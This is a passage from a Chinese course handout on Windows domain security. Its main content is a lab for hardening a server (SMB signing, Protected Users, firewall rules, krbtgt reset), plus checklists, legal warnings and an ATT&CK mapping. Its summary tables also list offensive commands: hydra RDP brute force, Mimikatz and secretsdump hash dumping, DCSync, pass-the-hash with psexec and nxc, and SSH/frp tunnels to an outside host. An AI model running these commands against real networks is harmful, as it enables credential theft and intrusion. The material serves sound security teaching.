| 层级 | 范围 | 管理账户 | 管理设备 | 隔离规则 |
| --- | --- | --- | --- | --- |
| **Tier 0** | 域控、AD DS、DNS | Enterprise/Domain Admins | 仅域控制器 | 禁止登录Tier 1/2设备 |
| **Tier 1** | 成员服务器（SQL、IIS等） | Server Admins | 成员服务器 | 禁止登录Tier 2设备 |
| **Tier 2** | 工作站/客户端 | Workstation Admins | 普通工作站 | 可登录普通工作站 |

> 💡 **核心原则**：高权限账户只能在高安全级别的设备上使用——防止域管在普通工作站上被窃取凭据。

---

## 🛠️ 实践操作

### 实验12：内网安全加固

> 本实验在 SRV02 上实施安全加固措施，然后验证加固效果。

**第一步：启用SMB签名（防御SMB中继攻击）**

```powershell
# 在 SRV02 上执行

# 方法一：通过注册表启用 SMB 签名
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "RequireSecuritySignature" -Value 1 -Type DWord
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "EnableSecuritySignature" -Value 1 -Type DWord

# 客户端也需要启用签名
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" -Name "RequireSecuritySignature" -Value 1 -Type DWord

# 方法二：通过组策略（域环境推荐）
# gpedit.msc → 计算机配置 → Windows 设置 → 安全设置 → 本地策略 → 安全选项
# "Microsoft网络服务器：对通信进行数字签名" → 已启用
# "Microsoft网络客户端：对通信进行数字签名" → 已启用

# 重启 SMB 服务使配置生效
Restart-Service LanmanServer -Force
Restart-Service LanmanWorkstation -Force

# 验证 SMB 签名已启用
Get-SmbServerConfiguration | Select-Object RequireSecuritySignature, EnableSecuritySignature
# 预期：RequireSecuritySignature = True, EnableSecuritySignature = True
```

**第二步：将高权限账户加入Protected Users组**

```powershell
# 在 SRV02（域控）上执行

# 将管理员账户加入 Protected Users 组
# Protected Users 组成员：禁止使用 NTLM 认证、禁止使用过期密码、禁止委派
Add-ADGroupMember -Identity "Protected Users" -Members "Administrator"

# 验证
Get-ADGroupMember -Identity "Protected Users" | Select-Object Name, SamAccountName
```

> 💡 **Protected Users 组的效果**：组成员不能使用 NTLM 认证（强制 Kerberos）、不能使用缓存凭据登录、不能使用过期密码。这直接阻断了 Pass-the-Hash 攻击。

**第三步：配置Windows防火墙限制横向移动**

```powershell
# 在 SRV02 上执行

# 先确保防火墙已启用
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True

# 限制 RDP 来源（仅允许指定IP访问3389）
# 将 RemoteAddress 替换为实际的管理端IP地址
Disable-NetFirewallRule -DisplayGroup "Remote Desktop"
New-NetFirewallRule -DisplayName "RDP-Allow-Admin" -Direction Inbound `
  -Protocol TCP -LocalPort 3389 -Action Allow `
  -RemoteAddress <管理端IP>

# 限制 WinRM 来源
Disable-NetFirewallRule -DisplayGroup "Windows Remote Management"
New-NetFirewallRule -DisplayName "WinRM-Allow-Admin" -Direction Inbound `
  -Protocol TCP -LocalPort 5985 -Action Allow `
  -RemoteAddress <管理端IP>

# 限制 SMB 来源（仅允许本地网段访问）
New-NetFirewallRule -DisplayName "SMB-Restrict" -Direction Inbound `
  -Protocol TCP -LocalPort 445 -Action Allow `
  -RemoteAddress <本地网段>/24

# 阻止 frp 等内网穿透工具的出站连接（基于端口）
New-NetFirewallRule -DisplayName "Block-FRP-Outbound" -Direction Outbound `
  -Protocol TCP -RemotePort 7000 -Action Block
```

**第四步：更改krbtgt密码使黄金票据失效**

```powershell
# 在域控（SRV02）上执行

# krbtgt 密码必须更改两次（因为 AD 保留了上一次的密码）
$pwd1 = ConvertTo-SecureString "N3wKrbtgt@2025!A" -AsPlainText -Force
$pwd2 = ConvertTo-SecureString "N3wKrbtgt@2025!B" -AsPlainText -Force

Set-ADAccountPassword -Identity krbtgt -NewPassword $pwd1 -Reset
Start-Sleep -Seconds 60  # 等待 AD 复制
Set-ADAccountPassword -Identity krbtgt -NewPassword $pwd2 -Reset

# 验证
Get-ADUser krbtgt -Properties PasswordLastSet | Select-Object Name, PasswordLastSet
```

**第五步：禁用不必要的服务**

```powershell
# 在 SRV02 上执行

# 如果不需要 WinRM，将其设为手动
Set-Service -Name "WinRM" -StartupType Manual
Stop-Service "WinRM"

# 禁用不需要的远程服务
# 注意：根据实际业务需要决定，以下仅为示例
Set-Service -Name "RemoteRegistry" -StartupType Disabled
Stop-Service "RemoteRegistry" -ErrorAction SilentlyContinue

# 关闭不必要的默认共享
net share C$ /delete
net share ADMIN$ /delete
# 注意：IPC$ 不能删除（系统共享）
```

**第六步：验证加固效果**

```bash
# 在 Kali 上验证

# 1. 验证 PtH 被阻止（Protected Users 效果）
nxc smb <ECS公网IP> --port 10004 -u administrator -H '<NTLM_HASH>'
# 预期：STATUS_LOGON_TYPE_NOT_GRANTED 或 STATUS_ACCESS_DENIED

# 2. 验证黄金票据失效
# 使用旧 krbtgt 哈希伪造的票据应无法使用
```

---

## 📝 任务五知识点总结

| 知识点 | 要点 |
| --- | --- |
| 纵深防御 | 网络隔离→身份安全→端点安全→监控检测→应急响应 |
| Tier管理模型 | Tier 0（域控）/ Tier 1（服务器）/ Tier 2（工作站），高权限账户只在高级别设备使用 |
| SMB签名 | 防御SMB中继攻击，通过注册表或组策略启用 |
| Protected Users | 禁止NTLM认证，直接阻断Pass-the-Hash攻击 |
| krbtgt密码重置 | 更改两次使所有黄金票据失效，建议每180天执行一次 |
| 防火墙策略 | 限制入站连接来源（IP白名单）、阻止出站到可疑端口 |
| 最小权限 | 禁用不必要的服务和默认共享，减少攻击面 |

---

# ✅ 阿里云 ECS / Windows Server 2022 课前检查清单

正式上课或验收前，建议教师先按下列项目完成一次预演：

| 检查项 | 命令/操作 | 通过标准 |
| --- | --- | --- |
| ECS 安全组 | 阿里云控制台 → ECS → 安全组 | 22、7000、7500、10000-20000 端口已放行 |
| ECS SSH 连接 | `ssh root@<ECS公网IP>` | 可正常登录 Ubuntu 系统 |
| frps 安装 | ECS 上执行 `ls /opt/frp/frps` | frps 可执行文件存在 |
| frps 启动 | ECS 上运行 `ss -tlnp \| grep -E "7000\|7500"` | frps 监听 7000/7500 |
| frp Dashboard | 浏览器访问 `http://<ECS公网IP>:7500` | 显示 frp 管理面板 |
| SRV02 本地虚拟机 | 本地 VMware 中启动 Windows Server，确认可访问互联网 | 可正常登录，可 `ping <ECS公网IP>` 通 |
| frpc 安装 | SRV02 上 `dir C:\frp\frpc.exe` | frpc.exe 存在 |
| frpc 连接 | SRV02 运行 `frpc.exe -c frpc.toml` | 显示 "login to server success" |
| 隧道验证 | Kali 上 `nmap -p 10001,10002 <ECS公网IP>` | 10001/10002 端口 open |
| Kali 工具检查 | `which nmap proxychains4 evil-winrm nxc` | 所有关键工具能找到路径 |
| NetExec 安装 | `sudo apt install -y netexec` | `nxc --help` 可正常显示帮助 |
| Impacket 安装 | `sudo apt install -y impacket-scripts python3-impacket` | `impacket-secretsdump -h` 可正常显示帮助 |

> 兼容性结论：使用阿里云 ECS（Ubuntu）部署 frps 服务端，本地虚拟机（Windows Server 2022）运行 frpc 客户端，可完成本讲义全部实验。课堂命令应以 NetExec（`nxc`）替代原 CrackMapExec 写法，Impacket 优先使用 `impacket-*` 命令。**实验结束后务必释放 ECS 实例，避免持续扣费。**

---

# 📚 项目八知识点总结

## 核心操作速查表

| 操作 | 命令/方法 |
| --- | --- |
| 阿里云安全组配置 | ECS 控制台 → 安全组 → 添加入站规则（22/7000/7500/10000-20000） |
| ECS SSH 连接 | `ssh root@<ECS公网IP>` |
| frp服务端启动 | `./frps -c frps.toml`（在阿里云 ECS 上） |
| frp客户端启动 | `frpc.exe -c frpc.toml`（在本地虚拟机 SRV02 上） |
| frp Dashboard | 浏览器访问 `http://<ECS公网IP>:7500` |
| SSH远程端口转发 | `ssh -R 远程端口:本地IP:本地端口 root@<ECS公网IP> -N -f` |
| SSH动态端口转发 | `ssh -D 1080 root@<ECS公网IP> -N -f`（SOCKS5代理） |
| Nmap经代理扫描 | `proxychains nmap -sT -p 端口 目标IP` |
| RDP暴力破解 | `hydra -L users.txt -P pwds.txt rdp://<ECS公网IP> -s 端口` |
| 获取NTLM哈希 | Evil-WinRM + `Invoke-Mimikatz` / `proxychains impacket-secretsdump` |
| Pass-the-Hash | `proxychains impacket-psexec -hashes :NTLM 用户@127.0.0.1` |
| DCSync导出域哈希 | `impacket-secretsdump 域/用户:密码@域控IP -just-dc-ntlm` |
| 启用SMB签名 | `Set-ItemProperty "LanmanServer\Parameters" "RequireSecuritySignature" 1` |
| Protected Users | `Add-ADGroupMember -Identity "Protected Users" -Members "用户名"` |
| 重置krbtgt密码 | `Set-ADAccountPassword -Identity krbtgt -NewPassword $pwd -Reset`（执行两次） |

## 常见错误排查表

| 问题 | 可能原因 | 解决方法 |
| --- | --- | --- |
| ECS 安全组端口不通 | 安全组未放行对应端口 | 在阿里云控制台添加入站规则 |
| frpc 连接 frps 失败 | Token 不一致、ECS 安全组未放行 7000、或 SRV02 无法上网 | 检查 token、安全组规则、SRV02 网络连通性 |
| frp 隧道已建立但无法访问服务 | 本地服务未启动或 localIP/localPort 配置错误 | 确认目标服务已启动，检查 frpc.toml 中的 proxies 配置 |
| proxychains nmap 超时 | SOCKS5 代理端口不正确或隧道断开 | 重新检查 frp SOCKS5 隧道状态，确认 proxychains 配置 |
| Hydra 破解 RDP 超时 | frp 隧道延迟导致超时 | 增加超时参数 `-w 10`，或降低并发线程 `-t 1` |
| Evil-WinRM 连接失败 | WinRM 服务未启用或端口映射配置错误 | 确认 SRV02 上 WinRM 已启用（`Enable-PSRemoting -Force`） |
| Impacket 脚本报端口错误 | Impacket 脚本不支持自定义端口 | 使用 NetExec（`nxc`）的 `--port` 参数辅助验证，或通过 frp SOCKS5 + proxychains 访问内网真实 IP |
| SMB签名启用后共享访问报错 | 旧版客户端不支持SMB签名 | 更新客户端系统，或临时关闭签名（不推荐） |
| Protected Users 后无法远程登录 | NTLM 被禁止，需使用 Kerberos | 确认客户端使用域账户和 Kerberos 认证 |

---

## 安全意识

### 攻防对抗思维

> **核心理念**：内网安全的本质不是"建高墙"（边界防火墙），而是"建多层墙"（纵深防御）。本项目从攻击者视角揭示 NAT 转发、内网穿透、横向移动等技术的实现原理，旨在说明：边界一旦被突破，缺乏内网防护的组织将面临全面沦陷的风险。唯有实施网络分段、身份隔离、终端防护、监控检测等多层防御，才能有效限制攻击扩散。

### 企业环境防御最佳实践

| 防御层次 | 措施 | 对应威胁 |
| --- | --- | --- |
| **网络隔离** | VLAN + 防火墙 + 微分段，限制跨区域通信 | 内网穿透、横向移动 |
| **出站控制** | 限制内网主机出站连接，阻止 frp/nps 等工具外连 | 内网穿透工具 |
| **凭据保护** | Credential Guard + Protected Users + 定期改密 | Pass-the-Hash、凭据窃取 |
| **协议安全** | SMB签名 + LDAP签名 + Kerberos AES加密 | SMB中继、中间人攻击 |
| **端点防护** | EDR + 应用白名单 + 补丁管理 | 恶意工具执行、漏洞利用 |
| **日志监控** | SIEM集中日志 + 异常行为告警 + 网络流量分析 | 攻击行为检测 |
| **权限管理** | Tier模型 + 最小权限 + 特权账户管理（PAM） | 权限提升、域控攻陷 |
| **应急响应** | 预案制定 + 定期演练 + 取证能力 | 攻击事件快速处置 |

### 免责与法律意识

> **法律红线**：在中国，《网络安全法》《刑法》第285条（非法侵入计算机信息系统罪）和第286条（破坏计算机信息系统罪）明确规定，未经授权对计算机信息系统实施渗透测试、植入内网穿透工具、进行横向移动等行为属于违法犯罪，最高可处七年有期徒刑。
>
> **合法授权是底线**：即使是安全研究人员，也必须在取得书面授权后才能进行渗透测试。教学实验环境（如虚拟机靶场）是学习这些技术的唯一合法场景。

---

## 课堂思考

1. **NAT安全**：NAT技术在提供地址转换的同时，是否也提供了安全防护？NAT能否替代防火墙？请从安全性和功能性两个角度分析。

2. **内网穿透检测**：frp 客户端需要主动连接外部服务器的 7000 端口。作为安全运维人员，如何在企业网络中检测和阻止 frp/nps 等内网穿透工具的使用？请列举至少三种检测方法。

3. **Pass-the-Hash防御**：Protected Users 组可以阻断 Pass-the-Hash 攻击，但加入该组后管理员在某些场景下可能无法正常工作（如非域环境、旧版客户端）。如何在安全性和可用性之间取得平衡？

4. **横向移动溯源**：攻击者通过 frp 隧道从外部访问内网，内网服务器看到的连接来源是 frp 客户端的 IP 而非攻击者的真实 IP。在真实企业环境中，如何有效溯源此类攻击？

5. **纵深防御设计**：假设你是一家中小企业的网络安全管理员，需要为公司的 Windows 域环境设计内网安全方案。请参考本项目所学内容，按优先级列出至少五项核心安全措施，并说明每项措施对应防御的攻击技术。

---

## 知识关联

本项目与前序项目的知识关联如下：

| 关联项目 | 关联内容 |
| --- | --- |
| **项目一·走进Windows服务器** | 项目一中配置的网络环境（NAT模式、IP配置）是本项目的基础；本项目通过阿里云 ECS 部署 frp 服务端，深化了对网络穿透和隧道技术的理解 |
| **项目四·IIS网站管理** | 项目四部署的 IIS Web 服务可作为内网穿透的映射目标（实验4的Web隧道），IIS 安全加固在内网环境中同样重要 |
| **项目五·远程管理** | 项目五配置的 RDP 和 WinRM 服务在本项目中成为横向移动的主要通道——RDP 暴力破解（实验9）、WinRM 远程执行（实验10）均依赖这些服务 |
| **项目六·域管理** | 项目六搭建的域环境为域级渗透提供基础；域用户凭据、krbtgt 等概念直接来自域管理知识 |
| **项目七·应用安全** | 项目七中讲解的后门持久化技术（注册表、计划任务、WMI）在内网渗透的"持久化"阶段使用；WebShell 可通过内网穿透隧道远程管理 |
| **实验六·域环境渗透与提权** | 本项目实验9-10的 PtH 横向移动为实验六的域级攻击（Kerberoasting→DCSync→黄金票据）提供前置技能；实验六在本项目基础上将攻击从工作组扩展到域环境，两者合在一起构成"网络层穿透→身份层渗透"的完整攻击链 |

### MITRE ATT&CK 框架映射

| 本项目技术 | ATT&CK战术 | ATT&CK技术ID |
| --- | --- | --- |
| NAT端口映射/内网穿透 | 命令与控制（C2） | T1090 - Proxy |
| frp/nps反向代理 | 命令与控制（C2） | T1090.001 - Internal Proxy |
| SSH隧道 | 命令与控制（C2） | T1572 - Protocol Tunneling |
| 网络扫描（Nmap） | 发现（Discovery） | T1046 - Network Service Discovery |
| ARP枚举 | 发现（Discovery） | T1018 - Remote System Discovery |
| RDP暴力破解 | 凭证访问（Credential Access） | T1110.001 - Brute Force: Password Guessing |
| Pass-the-Hash | 横向移动（Lateral Movement） | T1550.002 - Use Alternate Authentication Material: Pass the Hash |
| PsExec/WMIExec | 横向移动（Lateral Movement） | T1021.002 - Remote Services: SMB/Windows Admin Shares |
| Evil-WinRM | 横向移动（Lateral Movement） | T1021.006 - Remote Services: Windows Remote Management |
| secretsdump/DCSync* | 凭证访问（Credential Access） | T1003.006 - OS Credential Dumping: DCSync |
| 黄金票据* | 持久化（Persistence） | T1558.001 - Steal or Forge Kerberos Tickets: Golden Ticket |

> *标注*的技术在《实验六：Windows域环境渗透与提权》中详细展开
